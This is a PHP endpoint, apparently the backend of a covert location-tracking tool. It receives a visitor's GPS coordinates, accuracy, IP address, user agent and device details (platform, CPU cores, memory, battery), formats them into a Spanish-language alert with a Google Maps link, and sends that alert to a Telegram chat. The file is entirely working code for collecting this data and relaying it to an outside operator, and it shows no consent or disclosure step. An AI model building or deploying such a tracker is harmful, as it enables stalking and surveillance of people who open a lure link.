<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

header('Content-Type: application/json');

$raw = file_get_contents('php://input');
$payload = json_decode($raw, true);

if (!is_array($payload)) {
    http_response_code(400);
    echo json_encode(['status'=>'bad_request']);
    exit;
}

$lat = $payload['latitude'] ?? null;
$lon = $payload['longitude'] ?? null;
$acc = $payload['accuracy'] ?? null;
$device = $payload['device'] ?? [];

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "📍 <b>Nueva ubicación</b>\n";

if (!empty($ip)) $msg .= "🌐 IP: $ip\n";
if (!empty($lat)) $msg .= "📌 Lat: $lat\n";
if (!empty($lon)) $msg .= "📌 Lon: $lon\n";
if (!empty($acc)) $msg .= "🎯 Precisión: {$acc}m\n";
if (!empty($ua)) $msg .= "🖥️ UA: $ua\n";

if (!empty($device['platform'])) $msg .= "💻 Plataforma: {$device['platform']}\n";
if (!empty($device['architecture'])) $msg .= "🖥️ Arquitectura: {$device['architecture']}\n";
if (!empty($device['cores'])) $msg .= "🧠 Núcleos: {$device['cores']}\n";
if (!empty($device['memory'])) $msg .= "💾 Memoria: {$device['memory']} GB\n";
if (isset($device['batteryLevel'])) $msg .= "🔋 Batería: {$device['batteryLevel']}\n";
if (isset($device['charging'])) $msg .= "⚡ Cargando: " . ($device['charging'] ? 'Sí' : 'No') . "\n";

$msg .= "⏰ Hora: $ts\n";

if (!empty($lat) && !empty($lon)) $msg .= "🌍 Google Maps: https://www.google.com/maps?q={$lat},{$lon}\n";

send_to_telegram($msg);

echo json_encode(['status' => 'logged', 'timestamp' => $ts]);
?>
